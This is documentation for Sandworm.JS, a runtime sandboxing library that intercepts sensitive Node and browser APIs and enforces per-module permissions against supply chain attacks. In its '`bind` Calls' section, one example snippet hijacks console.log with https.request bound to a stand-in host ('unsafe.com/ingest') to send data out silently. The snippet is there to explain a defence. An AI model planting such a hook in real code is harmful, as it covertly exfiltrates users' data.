---
description: Easy sandboxing for your JavaScript dependencies 🪱
---

# Sandworm.JS



![Sandworm.JS](../logo.svg)

[![npm](https://img.shields.io/npm/v/sandworm?style=flat-square)](https://www.npmjs.com/package/sandworm) [![License](https://img.shields.io/npm/l/sandworm?style=flat-square)](https://github.com/sandworm-hq/sandworm-js/blob/main/LICENSE) [![CircleCI](https://img.shields.io/circleci/build/github/sandworm-hq/sandworm-js?style=flat-square)](https://app.circleci.com/pipelines/github/sandworm-hq/sandworm-js) ![Snyk Vulnerabilities for npm package](https://img.shields.io/snyk/vulnerabilities/npm/sandworm?style=flat-square) [![Maintainability](https://api.codeclimate.com/v1/badges/edff60f7f06bb0c589aa/maintainability)](https://codeclimate.com/github/sandworm-hq/sandworm-js/maintainability) [![Test Coverage](https://api.codeclimate.com/v1/badges/edff60f7f06bb0c589aa/test\_coverage)](https://codeclimate.com/github/sandworm-hq/sandworm-js/test\_coverage)

### TL;DR

* Sandworm intercepts all sensitive Node & browser APIs, like `child_process.exec` or `fetch`.
* It also knows what modules are responsible for each call.
* You can use it to:
  * audit your dependencies and see what your code is doing under the hood;
  * secure your app against supply chain attacks by enforcing per-module permissions.
* Install it as an `npm` module in your existing Node or browser app.
* Use the Inspector CLI tool to monitor activity and permissions.

#### Get involved

* Have a support question? [Post it here](https://github.com/sandworm-hq/sandworm-js/discussions/categories/q-a).
* Have a feature request? [Post it here](https://github.com/sandworm-hq/sandworm-js/discussions/categories/ideas).
* Did you find a security issue? [See SECURITY.md](contributing/security.md).
* Did you find a bug? [Post an issue](https://github.com/sandworm-hq/sandworm-js/issues/new/choose).
* Want to write some code? See [CONTRIBUTING.md](contributing/).

### ToC

* [Overview](index.md#overview)
* [Getting Started](index.md#getting-started)
* [Enforcing Permissions in Production Mode](index.md#enforcing-permissions-in-production-mode)
* [Supported Methods](LIBRARY.md)
* [Describing Permissions](index.md#describing-permissions)
  * [Explicit Permissions for Arbitrary Code Execution](index.md#explicit-permissions-for-arbitrary-code-execution)
  * [Node Cascading Calls](index.md#node-cascading-calls)
  * [`bind` Calls](index.md#bind-calls)
* [Caller Module Paths](index.md#caller-module-paths)
  * [Matching caller paths with RegEx](index.md#matching-caller-paths-with-regex)
  * [Trusted Modules](index.md#trusted-modules)
  * [Third Party Scripts](index.md#third-party-scripts)
  * [Browser Extensions](index.md#browser-extensions)
* [Configuration Options](index.md#configuration-options)
* [Using With Bundlers & SourceMaps](index.md#using-with-bundlers--sourcemaps)
  * [Configuring Sourcemaps](index.md#configuring-sourcemaps)
  * [Multiple Source Files](index.md#multiple-source-files)
* [How Sandworm is Tested](index.md#how-sandworm-is-tested)
* [Contributing](contributing/)

### Overview

Sandworm.JS is a sandboxing & malware detection tool for npm packages. Rather than relying on CVE advisories, Sandworm watches lower-level APIs like the Node VM and browser APIs like DOM manipulation, fetch, etc., and throws when a package unexpectedly accesses these APIs. While this won't protect against all classes of vulnerabilities, it assures that your project is safe from hand-crafted, zero-day vulnerabilities that leave your data open to attack until a CVE is issued and a fix is published.

Most tools in this space currently use static analysis to scan a package's source and infer potential threats by looking at code patterns, invoked methods, or loaded modules. However, it's generally simple to trick such analysis tools using [various obfuscation techniques](https://swag.cispa.saarland/papers/moog2021statically.pdf). Static analysis is, therefore, not a definitive security solution and should be used in tandem with dynamic tools like Sandworm.

Sandworm does dynamic analysis in the runtime - it knows about what happens when it happens:

* It can't let you know about possible vulnerabilities before it sees the code run;
* It also can't capture information about "dormant" code that doesn't get executed;
* No obfuscation or workaround can fool our interceptors, though: as soon as any code segment attempts to invoke a sensitive method, Sandworm will capture that call and be able to allow or deny access.

### Getting Started

Add the following lines to **the very start of your app's entry point** to load Sandworm in dev mode. In dev mode, all calls will be intercepted and tracked to the inspector tool, but no enforcement will happen (all calls will be allowed).

```javascript
const Sandworm = require('sandworm');
Sandworm.init({devMode: true});
```

\| **Note**: The code above needs to be the first thing your app runs when it boots so that Sandworm can adequately set up API interception and enforcement can begin if needed. If you load other modules or execute other code before this, you're no longer safe, as others will have had the opportunity to bypass Sandworm's process at that point.

\| **Note**: You can only call `init` once per your app's lifecycle.

\| **Note**: By default, only your app's code (at the `root` module level) will be allowed to call `init`. If you need another module to run Sandworm initialization (to support, for example, automated test setups), use the `allowInitFrom` config.

Next, start the inspector tool by running:

```bash
yarn sandworm # or npm run sandworm
```

The inspector interface is now available in your browser at http://localhost:7071/. It will update in real-time with details about module activity and used permissions as your app executes. The UI also allows you to generate the JSON permissions array you need to provide to support enforcing access when moving to production.

If your automated test process has good coverage, this is an excellent time to run it, have it walk through all code paths and functionality in your app, and collect all activity within the inspector.

![Sandworm Inspector](../cli/screenshot.png)

### Enforcing Permissions in Production Mode

To use in production mode and start enforcing module API access restrictions, provide a `permissions` array to `Sandworm.init`:

```javascript
const Sandworm = require('sandworm');
Sandworm.init({
    devMode: process.env.NODE_ENV === 'development',
    permissions: [{module: 'react-use', permissions: ['Storage.getItem', 'Storage.setItem']}],
});
```

* Update the `devMode` config to reflect your environment by using env vars or any other available signal;
* Provide an array of permission descriptors in the form of objects with a `module` name and a `permissions` array of strings corresponding to the allowed methods.
* The inspector can generate a baseline permissions array for you based on the activity captured in dev mode.

If an unauthorized execution attempt is detected, Sandworm will throw a `SandwormError`. Besides the `message` attribute, this error object also includes more details about the event:
* `module`: the invoking module name or path
* `method`: the invoked method (e.g. `fs.readFile`)

Note that errors might be swallowed by 3rd party code and not reach root level, so catching a `SandwormError`, while recommended, will not always work. To make sure your app code gets notified about every unauthorized execution, use the `onAccessDenied` configuration option to register a callback method that will always be triggered right before Sandworm throws, and passed the `SandwormError` object as an argument.

```javascript
const Sandworm = require('sandworm');
Sandworm.init({
    devMode: process.env.NODE_ENV === 'development',
    permissions: [...],
    onAccessDenied: (error) => {
      trackOrLogError(error.module, error.method);
    },
});
```

### Supported Methods

See [LIBRARY.md](LIBRARY.md).

### Describing Permissions

The `permissions` config option should be an array of permission descriptor objects with the following structure:

* a `module` property that can be either a string (matching a caller path exactly) or a RegExp (not recommended - see "Matching caller paths with RegEx" below).
* a `permissions` property that can either be a boolean value (representing access to the entire library of supported methods) or an array of granular string permissions, representing individual supported methods (like `Storage.setItem` or `Fetch.fetch`).

\| **Note**: If the `permissions` passed to Sandworm do not contain an explicit descriptor for the `root` module (your app code), it will be given all permissions by default (by appending `{module: 'root', permissions: true}` to the passed list). You can override this behavior and grant only specific, explicit permissions for the root module, just like for any other modules in your app, by passing a descriptor with `module: 'root'`.

\| **Note**: In dev mode, all modules are granted all permissions, and any passed `permissions` config is ignored.

#### Explicit Permissions for Arbitrary Code Execution

\| **Note**: This mainly applies to setting up permissions for the root module. For most use cases, you should avoid granting global permissions to a module call path to comply with [PoLP](https://en.wikipedia.org/wiki/Principle\_of\_least\_privilege). The default root permission descriptor is `{ module: 'root', permissions: true }`.

Setting `permissions: true` within a module descriptor will give that module (or call path) permissions to invoke any Sandworm-supported method **except** for a set of particularly unsafe ones that allow for arbitrary code execution - like `eval` or `vm.runInContext`. Using these methods carries a considerable security risk and should generally be avoided. Rigorously audit the code of a module that uses these before using it in your app.

However, suppose you do choose to give your app's code (or any specific caller) access to all underlying APIs **as well as** arbitrary code execution methods. In that case, you need to explicitly change your `permissions` from `true` to `['eval.eval', '*']` to acknowledge that you accept this high-risk configuration.

#### Node Cascading Calls

Some Node APIs internally call other APIs as part of their operation. For example:

* when loading local files, `require` uses several `fs` methods as well as `vm.compileFunction`;
* `https.require` uses `dns.lookup` and `tls.Socket`.

To support this, Sandworm will automatically allow the execution of any method calls where the direct caller is part of Node's internal sources. This would indicate that:

* another Node API has been previously invoked, resulting in the current cascading call;
* either the previous call has been captured and allowed by Sandworm;
* or it was not part of Sandworm's library, and thus deemed safe for free use.

#### `bind` Calls

For all intercepted methods, Sandworm will also capture and enforce access to `method.bind` **whenever it is called with more than one argument**. The reason behind this is that using `bind` to partially apply arguments creates contained methods that can then float around until they get executed by another module. For example:

```javascript
// Say we're a module that doesn't have `https.request` access
// but we want to post some stolen data to our server.
// We can create a custom method with the proper arguments using `bind`
// and then we can use it to replace a common js function.
// Sandworm will require the `bind.args` permission to allow this.
console.log = https.request.bind(this, {
  hostname: 'unsafe.com',
  port: 443,
  path: '/ingest',
  method: 'POST'
});

// Now we just wait for root to log anything
```

### Caller Module Paths

Sandworm-detected module names reflect the entire code path that led to invoking a method, from your app's level down to the actual module executing the method.

Let's say your app imports a module named `test-libB`, which depends on a method from a separate module, `test-libA`, which in turn ends up using `axios` to make an HTTP request. Internally, `axios` uses the `follow-redirects` module as a drop-in replacement for Node's `http` and `https` modules that automatically follows redirects. In this case, you should expect to see the following module name requesting to use the `https.request` permission:

```
test-libB>test-libA>axios>follow-redirects
```

Sandworm uses this path structure to create a proper security model. For example, let's say we want to grant permissions to the call described above:

* Since it initiated the call chain, we could directly grant access to the `test-libB` module. But this would enable **any of `test-libB`'s dependencies** to piggyback on this permission to execute malicious calls.
* We could also directly grant access to `follow-redirects`, but then we are effectively enabling any module in our app to use it for making any requests, including potentially malicious ones.
* The safest option is to grant explicit permissions to explicit module paths, like the one above:

```javascript
Sandworm.init({
    devMode: process.env.NODE_ENV === 'development',
    permissions: [{module: 'test-libB>test-libA>axios>follow-redirects', permissions: ['https.request', 'tls.connect', 'tls.createSecureContext', 'net.Socket', 'dns.lookup']}],
});
```

#### Matching caller paths with RegEx

In some scenarios, it is helpful to be able to grant permissions in bulk - like when executing inside a test runner. While this is not generally recommended and may lead to vulnerabilities outside of a controlled environment, the permission descriptor `module` property also accepts a `RegExp` to match multiple module names. Here's a real-world example taken from our automated tests using Jest:

```javascript
Sandworm.init({
    devMode: false,
    skipTracking: true,
    allowInitFrom: /jest-circus/,
    permissions: [
      // These are the Jest runner modules on node v12.0.0+
      {module: 'jest-runner>jest-circus>expect', permissions: false},
      {module: 'jest-runner>jest-circus', permissions: false},
      // These are the Jest runner modules on node v12.0.0 and below
      {module: 'jest-circus>expect', permissions: false},
      {module: 'jest-circus', permissions: false},
      // These are required by Jest
      // Jest runner needs vm.runInContext, we explicitly allow vm below
      {module: /jest/, permissions: ['vm', '*']},
      {module: /istanbul/, permissions: true},
      {module: /babel/, permissions: true},
      {module: 'react-is', permissions: true},
      {module: 'write-file-atomic', permissions: true},
      {module: 'stack-utils', permissions: true},
      {module: 'terminal-link', permissions: true},
      {module: 'pretty-format', permissions: true},
      {module: '@bcoe/v8-coverage', permissions: true},
      {module: 'source-map-support', permissions: true},
      {module: 'mkdirp', permissions: true},
      {module: 'make-dir', permissions: true},
      {module: 'convert-source-map', permissions: true},
      {module: 'glob', permissions: true},
    ],
  });
```

#### Trusted Modules

Sometimes, you might want to exclude specific module names from the caller path, as they are part of the trusted platform you're using to run your app. For example, when running React, the `react-dom` module usually sits at the bottom of the module hierarchy and is responsible for triggering most method calls. To specify trusted modules, use the `trustedModules` configuration option.

\| **Note**: when specifying a trusted module, you effectively permit it to do anything. Use this configuration carefully.

#### Third Party Scripts

Sandworm interprets scripts loaded via the `<script>` tag as individual modules. This is why, for example, you might see `https://googletagmanager.com` invoking `Beacon.sendBeacon` whenever your app sends analytics data. To modify this behavior:

* add the script to the `trustedModules` config array, or
* if the script is part of the app and built with a bundler, provide the path to a source map via the `loadSourceMaps` config option.

#### Browser Extensions

Sandworm can also catch activity coming from local, user-installed browser extensions. To enable this, set the `ignoreExtensions` config option to `false`. By default (`ignoreExtensions: true`), any invoke that has a browser extension anywhere in the call path will be passed through.

### Configuration Options

| Option | Default | Description |
| --- | --- | --- |
| `loadSourceMaps` | `true` in browsers `false` in Node | Set this to true to automatically load the sourcemap declared in the caller js file. Alternatively, to load multiple sources and sourcemaps, set this to an object with source file paths/URLs as keys and sourcemap file paths/URLs as values. |
| `devMode` | `false` | In dev mode, all calls are captured, allowed, and tracked to the inspector. When dev mode is false, Sandworm will enforce user-provided permissions and will not track calls. |
| `verbose` | `false` | The default logger level is `warn`; setting this to `true` lowers the level to `debug`. |
| `skipTracking` | `false` | Set this to true to stop event tracking to the inspector in dev mode. |
| `trackingIP` | `127.0.0.1` | The IP address for the inspector. |
| `trackingPort` | `7071` | The port number for the inspector. |
| `ignoreExtensions` | `true` | Ignore activity from browser extensions. |
| `trustedModules` | `[]` | Utility or platform modules that Sandworm should remove from a caller path. |
| `permissions` | `[]` | Module permissions to enforce if dev mode is false. |
| `allowInitFrom` | `root` | Specify a custom module that should be permitted to call `Sandworm.init`. |
| `onAccessDenied` | `undefined` | A function that will be invoked right before throwing on access denied. The error itself will be passed as the first arg. |

### Using With Bundlers & SourceMaps

Sandworm relies on source file paths to determine caller modules for each method invocation. Unfortunately, when bundling your code with Webpack, Parcel, Rollup, or other similar tools, that information is lost, as everything gets bundled together in a single file. To re-enable Sandworm in this scenario, you'll also need to provide a [sourcemap](https://developer.chrome.com/blog/sourcemaps/).

\| **Note**: when loading sourcemaps, `Sandworm.init` becomes an async method you need to `await`. It is best to wait for it to finish before importing other modules or further initializing your app. Until then, Sandworm will not be able to correctly infer module names, potentially leading to legitimate calls being blocked.

The simplest way to instruct Sandworm to load sourcemaps is to pass `loadSourceMaps=true` to `Sandworm.init`. Setting this option to `true` will load the sourcemap defined within the currently executing js file (containing the `init`-invoking code).

\| **Note**: `loadSourceMaps` is true by default when running Sandworm in a browser.

```javascript
await Sandworm.init({ loadSourceMaps: true });
```

#### Configuring Sourcemaps

Ideally, your generated sourcemap:

* should be inlined with the source file itself to save an extra network request;
* should exclude the sources, as you probably don't what those to be publicly available, and they will unnecessarily inflate the file size;
* should only include line numbers to reduce the file size, as we're only ever interested in original file names.

#### Multiple Source Files

If you're generating multiple source files in your bundling process, you'll need to let Sandworm know. Otherwise, js files distinct from the main file (the one that has initially called `init`) will be treated as entirely individual modules. To signal you need multiple code files, pass an object to the `loadSourceMaps` option with source paths (or URLs) as keys and sourcemap paths (or URLs) as values:

```javascript
await Sandworm.init({
  loadSourceMaps: {
          'http://localhost:3001/static/js/main.chunk.js':
            'http://localhost:3001/static/js/main.chunk.js.map',
          'http://localhost:3001/static/js/vendors~main.chunk.js':
            'http://localhost:3001/static/js/vendors~main.chunk.js.map',
        },
});
```

### How Sandworm is Tested

Sandworm has several layers of automated testing:

* Jest is used to run Node.js capture & enforce tests for all supported Node APIs (tests run on Node 10.14 and above). See the `tests/node` directory.
* Playwright is used to run browser capture & enforce tests for all supported browser APIs (tests run on WebKit, Chromium, and Firefox). See the `tests/web` directory.
* Jest is used to run unit tests on the core Sandworm source files. See the `tests/unit` directory.

Check out our latest test run inside our [CircleCI pipeline](https://app.circleci.com/pipelines/github/sandworm-hq/sandworm-js).
